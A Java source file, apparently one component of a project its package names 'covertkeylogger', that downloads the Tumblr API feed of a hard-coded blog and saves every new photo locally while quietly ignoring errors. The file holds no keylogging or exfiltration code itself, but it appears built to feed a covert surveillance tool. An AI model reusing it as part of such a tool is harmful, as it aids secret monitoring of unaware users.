package covertkeylogger;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.w3c.dom.Node;
import org.w3c.dom.Element;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;

/**
 * 
 * @author Downloads images from a file sharing site...
 *
 */
public class Downloader {
	
	public static ArrayList<String> beenDownloaded= new ArrayList<String>();
	
	public static void main(String[] args) {
		
		getImages("cklhaxsaw1");
		
	}
	
	
	private static int imageCounter = 0;
	
	
	public static void deletePrevious() {
		
		//Create directories if they dont exist...
				(new File("downloaded")).mkdirs();
				
				//Delete previously saved contents
				DeleteFolderContents.delete(new File("downloaded"));
				return;
		
	}
	
	
	public static void getImages(String blogName) {
		
		
		URL website;
		try {
		
		website = new URL("http://" + blogName + ".tumblr.com/api/read");
	    ReadableByteChannel rbc = Channels.newChannel(website.openStream());
	    FileOutputStream fos = new FileOutputStream("downloaded/data.xml");
	    fos.getChannel().transferFrom(rbc, 0, 1 << 24);
	    fos.close();
	    
		} catch (MalformedURLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
		try {
			 
			File fXmlFile = new File("downloaded/data.xml");
			DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
			DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
			Document doc = dBuilder.parse(fXmlFile);
		 
			//optional, but recommended
			//read this - http://stackoverflow.com/questions/13786607/normalization-in-dom-parsing-with-java-how-does-it-work
			doc.getDocumentElement().normalize();
		 
			System.out.println("Root element :" + doc.getDocumentElement().getNodeName());
		 
			NodeList nList = doc.getElementsByTagName("post");
		 
			System.out.println("----------------------------");
			
			for (int temp = 0; temp < nList.getLength(); temp++) {
		 
				Node nNode = nList.item(temp);
		 
				//System.out.println("\nCurrent Element :" + nNode.getNodeName());
		 
				if (nNode.getNodeType() == Node.ELEMENT_NODE) {
		 
					Element eElement = (Element) nNode;
		 
					//System.out.println("Staff id : " + eElement.getAttribute("id"));
					//System.out.println("First Name : " + eElement.getElementsByTagName("firstname").item(0).getTextContent());
					//System.out.println("Last Name : " + eElement.getElementsByTagName("lastname").item(0).getTextContent());
					//System.out.println("Nick Name : " + eElement.getElementsByTagName("nickname").item(0).getTextContent());
				//	System.out.println(eElement.getElementsByTagName("photo-url").item(0).getTextContent());
		 
					String imageAddress = eElement.getElementsByTagName("photo-url").item(0).getTextContent();
					
					boolean download = true;
					
					for (String addr : beenDownloaded) {
						
						if (addr.equals(imageAddress)) {
							
							download = false;
							break;
						}

					}
					
					if (download)
					{
						website = new URL(imageAddress);
					    ReadableByteChannel rbc = Channels.newChannel(website.openStream());
					    FileOutputStream fos = new FileOutputStream("downloaded/image" + (imageCounter++) + ".png");
					    fos.getChannel().transferFrom(rbc, 0, 1 << 24);
					    fos.close();
					    
					    //add to list of already downloaded
					    beenDownloaded.add(imageAddress);
						System.out.println(imageAddress);

					}
					
					
					
				}
			}
		    } catch (Exception e) {
			
		    		//Quietly ignore....
		    	
		    }
		    
		/*try {
			Thread.sleep(30000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}*/    
		
		
		
		  }

	public static void resetCounter() {
		// TODO Auto-generated method stub
		
		imageCounter = 0;
		
	}
		 
		}
	
	

